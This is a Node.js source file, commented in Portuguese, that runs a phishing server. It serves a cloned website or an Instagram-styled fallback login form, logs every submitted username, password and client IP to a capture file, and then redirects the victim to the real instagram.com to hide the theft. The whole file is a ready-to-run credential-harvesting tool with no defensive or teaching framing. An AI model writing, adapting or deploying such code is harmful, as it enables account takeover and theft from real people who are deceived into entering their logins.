const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8080;
const SITE_DIR = process.env.SITE_DIR || path.join(__dirname, '..', 'site_clone');
const LOG_FILE = process.env.LOG_FILE || path.join(__dirname, '..', 'capturas.txt');
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://instagram.com';

const MIME_TYPES = {
    '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript',
    '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
    '.gif': 'image/gif', '.svg': 'image/svg+xml', '.ico': 'image/x-icon',
    '.woff': 'font/woff', '.woff2': 'font/woff2', '.ttf': 'font/ttf',
    '.json': 'application/json', '.xml': 'application/xml',
};

function captureCredentials(body, clientIP) {
    const timestamp = new Date().toISOString().replace('T', ' ').split('.')[0];
    const params = new URLSearchParams(body);
    const data = {};
    for (let [key, value] of params.entries()) {
        data[key] = value;
    }
    const logEntry = `[${timestamp}] IP: ${clientIP} | Dados: ${JSON.stringify(data)}\n`;
    fs.appendFileSync(LOG_FILE, logEntry);
    console.log('\n[CAPTURADO]');
    console.log(logEntry);
}

// Servir arquivo estático ou fallback
function serveStatic(req, res) {
    let filePath = req.url === '/' ? '/index.html' : req.url.split('?')[0];
    filePath = path.join(SITE_DIR, filePath);

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    fs.readFile(filePath, (err, data) => {
        if (err) {
            // Fallback: formulário genérico
            const fallbackHTML = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.box{background:#fff;border:1px solid #dbdbdb;border-radius:8px;padding:40px;width:100%;max-width:350px;text-align:center}
h1{margin-bottom:30px;font-weight:400;font-size:24px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:4px;font-size:14px;outline:none}
input:focus{border-color:#0095f6}button{width:100%;padding:12px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:bold;font-size:14px;cursor:pointer}
button:hover{background:#1877f2}</style></head><body>
<div class="box"><h1>Login</h1><form method="POST" action="/login">
<input type="text" name="username" placeholder="Usuário ou Email" required>
<input type="password" name="password" placeholder="Senha" required>
<button type="submit">Entrar</button></form></div></body></html>`;
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(fallbackHTML);
            return;
        }
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(data);
    });
}

const server = http.createServer((req, res) => {
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Capturar POST de qualquer formulário
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            if (body) {
                captureCredentials(body, clientIP);
            }
            // Redirecionar para URL original
            res.writeHead(302, { 'Location': REDIRECT_URL });
            res.end();
        });
        return;
    }

    // Servir arquivos estáticos
    serveStatic(req, res);
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
